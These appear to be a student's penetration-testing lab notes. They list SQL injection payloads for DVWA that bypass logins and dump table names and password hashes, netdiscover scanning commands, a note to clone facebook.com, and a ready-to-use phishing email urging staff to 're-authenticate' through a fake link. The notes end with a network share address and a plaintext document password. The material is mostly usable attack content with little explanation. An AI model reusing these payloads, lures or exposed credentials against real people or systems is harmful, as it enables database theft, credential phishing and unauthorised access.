# SQLi
When DVWA security is set to LOW:

1.)Reveals all user is:1' OR '1'='1'#

2.)Reveals name of all tables in the database:'UNION SELECT table_name, NULL FROM information_schema.tables#

3.)Reveals all the column names form 'users' table:'UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name= 'users'#

4.)Reveals all the usernames and password hashes:'UNION SELECT user, password FROM users#

# Siteclone
https://facebook.com

# John the Ripper
https://www.stationx.net/how-to-use-hydra/

# netdiscover
Command | Explanation

sudo netdiscover | Auto-scans your current subnet to find live hosts.

sudo netdiscover -r 192.168.1.0/24 | Scans a specific subnet range manually.

sudo netdiscover -f | Performs a fast scan with less accuracy.

sudo netdiscover -i eth0 | Uses a specific network interface (e.g., eth0 or wlan0).

sudo netdiscover -r 192.168.1.0/24 > output.txt | Saves scan results to a text file.

sudo netdiscover -s | Continuously scans and updates live devices in real-time.

sudo netdiscover -p | Passive mode: silently listens to ARP traffic without sending packets.

# Phishing
Subject: [Action Required] System Security Update – Verify Your Account

Dear [Employee Name],

As part of our institution's routine security maintenance, we are rolling out an update to the internal login portal. To ensure uninterrupted access, all users are required to re-authenticate their credentials.

Please verify your account by visiting the secure portal at the link below:

https://institution-login-verification.example.com

This must be completed by 6:00 PM today to prevent temporary access restrictions.

Thank you for your prompt attention.

Sincerely,
IT Support Team
[Institution Name]





















































________________________



\\\10.125.100.100    

The key to vapt docx is : PwD#2424
